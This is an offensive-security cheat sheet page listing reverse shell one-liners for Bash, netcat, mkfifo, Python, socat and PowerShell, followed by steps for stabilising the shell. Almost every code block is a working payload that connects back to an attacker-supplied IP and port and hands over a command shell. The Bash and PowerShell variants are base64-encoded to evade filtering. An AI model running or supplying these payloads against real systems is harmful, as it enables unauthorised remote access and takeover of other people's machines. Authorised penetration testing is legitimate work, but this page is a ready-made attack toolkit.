---
icon: book-skull
---

# Reverse Shells

## Reverse Shells

### Reverse Shell Generator

[https://www.revshells.com/](https://www.revshells.com/)

### Bash

{% tabs %}
{% tab title="Bash" %}
{% code overflow="wrap" %}
```bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```
{% endcode %}

{% hint style="info" %}
It is recommended to encapsulate the command in a `bash -c ''` to prevent issues with the _**/dev/tcp**_ bash functionality.
{% endhint %}
{% endtab %}

{% tab title="Base64" %}
We can encode the content in **base64**, to avoid conflicts with symbols and spaces in the URL. Additionally, to prevent any _"+"_ characters from appearing, we can use double encoding.

Generate the payload:

{% code overflow="wrap" %}
```bash
echo "bash -i >& /dev/tcp/<ip>/<port> 0>&1" | base64 | base64 | xargs -I{} echo "echo {}|base64 -d|base64 -d|bash"
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Netcat

```bash
nc -e /bin/bash <ip> <port>
```

### Mkfifo

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
```

### Python

{% code overflow="wrap" %}
```bash
i="<ip>" p=<port> && echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$i',$p));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('bash')" | python
```
{% endcode %}

### Socat

```bash
socat tcp-connect:<ip>:<port> exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

### PowerShell

{% tabs %}
{% tab title="Base64" %}
Generate the payload:

{% code overflow="wrap" %}
```bash
echo '$client = New-Object System.Net.Sockets.TCPClient("<ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t utf-16le | base64 -w 0 | xargs echo "powershell -e"
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Interactive TTY

{% tabs %}
{% tab title="Script" %}
```bash
script -qc bash /dev/null
```
{% endtab %}

{% tab title="Python" %}
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
{% endtab %}
{% endtabs %}

and then run:

```bash
# Press <Ctrl> + z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows <rows> columns <cols>  # Check size in another window -> stty size
```

#### Automatic Shell Stabilization

This script sets up a handler and automatically stabilizes Linux reverse shells. And for Windows machines uses `rlwrap` to allow command history, CTRL + L to clear the screen and other functions, also preventing CTRL + C from killing the session

{% embed url="https://github.com/NLXZ/pwnc/" %}

```sh
# Add it to your PATH
wget https://raw.githubusercontent.com/NLXZ/pwnc/refs/heads/main/pwnc.sh -O ~/.local/bin/pwnc
chmod +x ~/.local/bin/pwnc
```
